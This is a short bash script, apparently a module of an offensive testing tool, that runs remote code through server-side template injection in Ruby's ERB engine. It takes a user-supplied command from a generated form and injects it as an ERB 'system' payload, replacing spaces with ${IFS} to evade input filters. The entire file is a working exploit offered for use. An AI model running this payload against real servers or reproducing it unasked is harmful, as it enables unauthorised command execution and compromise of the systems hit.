#!/bin/bash

: '
SSTI - Ruby template engine (ERB) RCE, execute code
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
CMD_FIELD=$(form_item "execute cmd" "cmd" "id")

# Generate GUI form
generate_form "${CMD_FIELD}"

CMD=${form_data["cmd"]}

execute_command "<%=system(\"${CMD// /\$\{IFS\}}\")%>"
